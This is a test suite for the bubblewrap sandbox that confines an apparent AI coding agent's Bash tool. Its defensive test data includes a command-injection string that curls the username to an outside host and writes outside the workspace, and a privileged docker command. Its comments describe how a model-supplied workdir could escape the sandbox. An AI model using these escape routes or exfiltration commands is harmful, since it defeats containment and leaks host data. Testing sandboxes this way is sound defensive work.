import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { existsSync, mkdtempSync, rmSync, writeFileSync } from 'fs';
import { homedir, tmpdir } from 'os';
import { join, posix, resolve, win32 } from 'path';
import {
  buildSandboxExecution,
  createSandbox,
  matchesExcludedCommand,
  sandboxCoverage,
  sandboxPolicySummary,
  unbindablePaths,
  unsandboxedRefusalMessage,
  type SandboxHost,
} from './sandbox.js';
import { DEFAULT_SETTINGS, type ResolvedSettings } from './settings.js';

function sandboxSettings(
  overrides: Partial<ResolvedSettings['sandbox']> = {},
): ResolvedSettings['sandbox'] {
  return { ...structuredClone(DEFAULT_SETTINGS.sandbox), enabled: true, ...overrides };
}

/**
 * A fully injected host on which every path "exists": the generated argv
 * depends only on the code under test, never on which system directories the
 * machine running the suite happens to have. Without this, an assertion that
 * `/usr` is bound holds on Linux and silently asserts on an empty bind list on
 * Windows CI, where `resolve('/usr')` lands on `C:\usr` and nothing is there.
 */
function allExistingHost(flavour: typeof posix | typeof win32): SandboxHost {
  return {
    path: flavour,
    exists: () => true,
    isDirectory: () => true,
    homedir: () => (flavour === win32 ? 'C:\\Users\\book' : '/home/book'),
  };
}

describe('buildSandboxExecution', () => {
  it('passes the command as a single argv element so no outer shell can parse it', () => {
    const command = 'echo hi; touch /tmp/escaped && curl $(whoami).example.com';
    const exec = buildSandboxExecution('/usr/bin/bwrap', command, '/work', sandboxSettings());

    expect(exec.file).toBe('/usr/bin/bwrap');
    // Everything the user wrote lives in exactly one element, at the end.
    expect(exec.args.at(-1)).toBe(command);
    expect(exec.args.filter((arg) => arg.includes(';'))).toEqual([command]);
    expect(exec.args.slice(-3)).toEqual(['/bin/bash', '-c', command]);
    expect(exec.args.at(-4)).toBe('--');
  });

  it('binds the workspace after the /tmp tmpfs so a workspace under /tmp survives', () => {
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-order-'));
    try {
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', dir, sandboxSettings());
      const tmpfsIndex = exec.args.indexOf('--tmpfs');
      const bindIndex = exec.args.indexOf(dir);
      expect(tmpfsIndex).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(tmpfsIndex);
      expect(exec.args[bindIndex - 1]).toBe('--bind');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it.each([
    { flavourName: 'posix', flavour: posix, workspace: '/work' },
    { flavourName: 'win32', flavour: win32, workspace: 'C:\\work' },
  ])(
    'binds the workspace after the system read-only mounts ($flavourName paths)',
    ({ flavour, workspace }) => {
      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        workspace,
        sandboxSettings(),
        allExistingHost(flavour),
      );
      const roIndex = exec.args.lastIndexOf('--ro-bind');
      const bindIndex = exec.args.lastIndexOf('--bind');
      // Both mounts must actually be present before their order means anything:
      // -1 > -1 would vacuously "order" two lookups that found nothing.
      expect(roIndex).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(roIndex);
      expect(exec.args[bindIndex + 1]).toBe(flavour.resolve(workspace));
    },
  );

  it('still binds the workspace when no POSIX system mount exists (the Windows host shape)', () => {
    // A Windows host is exactly this: /usr, /lib, … resolve onto the current
    // drive and none exist, so every system read-only bind is skipped. The
    // workspace bind must survive that on its own.
    const workspace = 'C:\\work';
    const host: SandboxHost = {
      ...allExistingHost(win32),
      exists: (path) => path === workspace,
    };
    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      workspace,
      sandboxSettings(),
      host,
    );
    expect(exec.args).not.toContain('--ro-bind');
    const bindIndex = exec.args.indexOf('--bind');
    expect(bindIndex).toBeGreaterThan(-1);
    expect(exec.args.slice(bindIndex, bindIndex + 3)).toEqual(['--bind', workspace, workspace]);
  });

  it('shares the network only when no domain policy is declared', () => {
    const open = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(open.args).toContain('--share-net');
    expect(open.args).not.toContain('--unshare-net');
  });

  it('fails closed to no network when a per-domain policy is declared', () => {
    // bubblewrap has no DNS or domain awareness, so an allow-list cannot be
    // honoured as written; handing over the full host network would be worse.
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).toContain('--unshare-net');
    expect(exec.args).not.toContain('--share-net');

    const denied = sandboxSettings();
    denied.network.deniedDomains = ['evil.example'];
    expect(buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', denied).args).toContain(
      '--unshare-net',
    );
  });

  it('applies declared filesystem policy after the workspace bind', () => {
    const writable = mkdtempSync(join(tmpdir(), 'book-sbx-rw-'));
    const readonly = mkdtempSync(join(tmpdir(), 'book-sbx-ro-'));
    const masked = mkdtempSync(join(tmpdir(), 'book-sbx-hide-'));
    try {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = [writable];
      settings.filesystem.denyWrite = [readonly];
      settings.filesystem.denyRead = [masked];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      expect(exec.args[exec.args.indexOf(writable) - 1]).toBe('--bind');
      expect(exec.args[exec.args.indexOf(readonly) - 1]).toBe('--ro-bind');
      expect(exec.args[exec.args.indexOf(masked) - 1]).toBe('--tmpfs');
    } finally {
      for (const dir of [writable, readonly, masked]) {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it('skips bind sources that do not exist, which bwrap would reject', () => {
    const settings = sandboxSettings();
    settings.filesystem.allowWrite = ['/definitely/not/a/real/path'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).not.toContain('/definitely/not/a/real/path');
  });

  it('drops capabilities and ties the sandbox lifetime to the spawning process', () => {
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.join(' ')).toContain('--cap-drop ALL');
    expect(exec.args).toContain('--die-with-parent');
  });

  it('never uses --new-session, which would break every process-group kill', () => {
    // bwrap calls setsid() under --new-session, moving the sandboxed tree out
    // of the process group Node created with `detached: true`. KillShell, the
    // foreground timeout, and Ctrl-C all signal that group and confirm death
    // with kill(-pgid, 0), so the group would read as empty while the command
    // kept running.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args).not.toContain('--new-session');
  });

  it('masks a denied file with /dev/null instead of a tmpfs that would abort bwrap', () => {
    // --tmpfs mkdirs its target, so pointing it at a file fails the whole
    // invocation with "Not a directory" — and a credentials file is the most
    // natural thing to put in denyRead.
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-file-'));
    const file = join(dir, 'creds.txt');
    writeFileSync(file, 'secret');
    try {
      const settings = sandboxSettings();
      settings.filesystem.denyRead = [file, dir];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      const fileIndex = exec.args.indexOf(file);
      expect(exec.args[fileIndex - 1]).toBe('/dev/null');
      expect(exec.args[fileIndex - 2]).toBe('--ro-bind');
      // A directory still gets the tmpfs mask.
      expect(exec.args[exec.args.indexOf(dir) - 1]).toBe('--tmpfs');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('expands ~ in configured filesystem paths', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyWrite = ['~'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    // Without expansion this resolves to "<cwd>/~", which does not exist and
    // would be dropped — unenforced policy the user believes is active.
    expect(exec.args).toContain(homedir());
    expect(exec.args).not.toContain(resolve('~'));
  });

  it('binds the workspace root, never a caller-supplied working directory', () => {
    // `workdir` is a model-supplied Bash argument. Binding it would let the
    // model widen its own sandbox: `--bind / /` emitted last shadows every
    // other mount and returns the whole host filesystem, read-write.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.filter((arg) => arg === '/')).toHaveLength(0);
  });
});

describe('unbindablePaths', () => {
  it('reports configured paths that cannot be applied', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyRead = ['/definitely/not/real', '~/also-not-real-xyz'];
    settings.filesystem.allowWrite = [tmpdir()];
    expect(unbindablePaths(settings)).toEqual(['/definitely/not/real', '~/also-not-real-xyz']);
  });
});

describe('createSandbox', () => {
  it('returns null when sandbox.enabled is false', () => {
    expect(createSandbox(sandboxSettings({ enabled: false }))).toBeNull();
  });

  it('warns that domain rules cannot be enforced', () => {
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const sandbox = createSandbox(settings);
    if (sandbox) {
      expect(warnSpy.mock.calls.flat().join(' ')).toMatch(/domain rules cannot be enforced/i);
    }
    warnSpy.mockRestore();
  });

  it('throws when failIfUnavailable is true and the sandbox cannot be built', () => {
    const settings = sandboxSettings({ failIfUnavailable: true });
    try {
      expect(['object', 'null']).toContain(typeof createSandbox(settings));
    } catch (e) {
      expect(e).toBeInstanceOf(Error);
      expect((e as Error).message).toMatch(/bwrap|sandbox|Windows/i);
    }
  });
});

describe('Bash tool integration with sandbox', () => {
  let dir: string;
  const ctx = {
    workspaceRoot: '',
    env: {},
    sandbox: undefined as ResolvedSettings['sandbox'] | undefined,
  };

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'book-sandbox-'));
    ctx.workspaceRoot = dir;
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it('runs commands normally when sandbox is disabled', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings({ enabled: false });
    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('hello');
    expect(result.content).not.toContain('[sandboxed]');
  });

  it('marks output as [sandboxed] when sandbox is enabled and available', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return; // no bwrap on this host

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('[sandboxed]');
    expect(result.content).toContain('hello');
  });

  it('still supports shell syntax inside the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo one && echo two | tr a-z A-Z' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('one');
    expect(result.content).toContain('TWO');
  });

  it('refuses a workdir outside the workspace rather than binding it', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // Binding a model-supplied workdir is a complete escape: `--bind / /`
    // emitted after the default mounts shadows all of them.
    const escapeTarget = join(tmpdir(), `book-sandbox-workdir-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `touch ${escapeTarget}`, workdir: '/' },
      },
      ctx,
    );

    try {
      expect(result.status).not.toBe('success');
      expect(result.content + (result.structuredError?.message ?? '')).toMatch(
        /outside the sandboxed workspace/i,
      );
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });

  it('confines writes reached through shell metacharacters to the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // The escape this guards against: when the wrapper is joined into one
    // string and spawned with `shell: true`, the host shell splits on `;` and
    // runs the second command outside bwrap entirely.
    const escapeTarget = join(tmpdir(), `book-sandbox-escape-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });
    const inside = join(dir, 'inside.txt');

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `echo contained > ${inside}; echo pwned > ${escapeTarget}` },
      },
      ctx,
    );

    try {
      expect(result.status).toBe('success');
      // The workspace bind is real: the in-workspace write reaches the host.
      expect(existsSync(inside)).toBe(true);
      // /tmp is a tmpfs inside the sandbox, so the second write never lands.
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });
});

describe('matchesExcludedCommand', () => {
  it('matches a glob pattern against the whole command', () => {
    expect(matchesExcludedCommand('docker build .', ['docker *'])).toBe(true);
    expect(matchesExcludedCommand('git status', ['docker *'])).toBe(false);
  });

  it('matches against the whole command, not the first line getPrimaryArg would keep', () => {
    // The permission path and the execution path must judge the same text.
    // getPrimaryArg truncates a command to its first line, so a pattern that
    // only matches the full text would be missed by a first-line matcher and
    // the command would be judged sandboxed while Bash ran it unsandboxed.
    const command = 'echo hello\ndocker run --privileged evil';
    expect(matchesExcludedCommand(command, [command])).toBe(true);
    expect(matchesExcludedCommand(command.split('\n')[0], [command])).toBe(false);
  });

  it('treats a missing pattern list as no exclusions', () => {
    expect(matchesExcludedCommand('anything', [])).toBe(false);
    expect(matchesExcludedCommand('anything', undefined)).toBe(false);
  });
});

describe('sandboxCoverage', () => {
  const available = () => true;
  const unavailable = () => false;

  it('reports a genuinely sandboxed command', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), available)).toEqual({ sandboxed: true });
  });

  it('reports "disabled" when sandboxing is off', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), available)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('reports "excluded" for a command matching sandbox.excludedCommands', () => {
    const settings = sandboxSettings({ excludedCommands: ['docker *'] });
    expect(sandboxCoverage('docker ps', settings, available)).toEqual({
      sandboxed: false,
      reason: 'excluded',
    });
    expect(sandboxCoverage('ls', settings, available)).toEqual({ sandboxed: true });
  });

  it('reports "unavailable" when the bubblewrap backend is missing', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), unavailable)).toEqual({
      sandboxed: false,
      reason: 'unavailable',
    });
  });

  it('prefers "disabled" over "unavailable" so the diagnosis is the actionable one', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), unavailable)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('does not probe the backend when sandboxing is disabled or the command is excluded', () => {
    const probe = vi.fn(() => true);
    sandboxCoverage('ls', sandboxSettings({ enabled: false }), probe);
    sandboxCoverage('docker ps', sandboxSettings({ excludedCommands: ['docker *'] }), probe);
    expect(probe).not.toHaveBeenCalled();
  });
});

describe('unsandboxedRefusalMessage', () => {
  it.each([
    ['disabled' as const, 'sandbox.enabled is false'],
    ['excluded' as const, 'sandbox.excludedCommands'],
    ['unavailable' as const, 'bubblewrap'],
  ])('names the setting and the reason for %s', (reason, expectedReason) => {
    const message = unsandboxedRefusalMessage(reason);
    expect(message).toContain('sandbox.allowUnsandboxedCommands');
    expect(message).toContain(expectedReason);
    // Actionable: it must say what to change, not only what failed.
    expect(message).toMatch(/set sandbox\.allowUnsandboxedCommands to true/);
  });
});

describe('sandboxPolicySummary', () => {
  const active = { sandboxActive: true, adjudicationConfigured: false };

  it('reports refusal when allowUnsandboxedCommands is false', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ allowUnsandboxedCommands: false }),
      active,
    );
    expect(summary.unsandboxedCommands).toContain('refused');
    expect(summary.unsandboxedCommands).toContain('sandbox.allowUnsandboxedCommands=false');
  });

  it('reports auto-allow as inert when no sandbox is actually active', () => {
    const summary = sandboxPolicySummary(sandboxSettings({ enabled: false }), {
      ...active,
      sandboxActive: false,
    });
    expect(summary.autoAllowBash).toContain('inert');
  });

  it('reports auto-allow as on only when a sandbox is actually active', () => {
    expect(sandboxPolicySummary(sandboxSettings(), active).autoAllowBash).toContain('on for');
  });

  // The auto-allow only stands in for the *default* ask, so any configured
  // deny/ask rule makes it inert. Reporting "on" there would tell the user the
  // sandbox is skipping prompts that Book is in fact still raising.
  it('reports auto-allow as inert when deny/ask rules are configured', () => {
    const summary = sandboxPolicySummary(sandboxSettings(), {
      ...active,
      adjudicationConfigured: true,
    });
    expect(summary.autoAllowBash).toContain('inert');
    expect(summary.autoAllowBash).toContain('permissions.deny/ask');
  });

  it('reports auto-allow as off when the key is false, even with an active sandbox', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ autoAllowBashIfSandboxed: false }),
      active,
    );
    expect(summary.autoAllowBash).toContain('off');
    expect(summary.autoAllowBash).toContain('sandbox.autoAllowBashIfSandboxed=false');
  });
});
